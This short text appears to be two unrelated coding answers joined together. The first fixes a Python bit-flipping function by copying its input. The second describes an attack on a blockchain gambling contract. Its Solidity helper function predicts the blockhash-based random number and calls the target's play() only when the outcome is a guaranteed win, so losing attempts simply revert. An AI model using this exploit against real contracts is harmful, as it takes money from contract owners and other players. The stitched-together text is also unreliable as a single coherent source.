Introduce a copy of the input and use it in the test. E.g.:

def pi_func(b):
    orig = b
    for i in range(8):
        if ((orig >> i) & 1) == 1:
            b ^= 1 << ((i + 3) % 8)
        else:
            b ^= 1 << ((i + 5) % 8)
    return b

Implement your attack as one on-chain transaction that both computes the RNG and, only if it is zero, calls play.  For example in your helper contract:

```solidity
function attack(uint256 bet) external {
  require(_randomNumber() == 0, "not your lucky block") ;
  target.play{ value: bet }(bet);
}
```

Calling `attack(...)` each block either reverts (no loss) or wins—everything happens in the same transaction so your view of the blockhash matches the target’s.
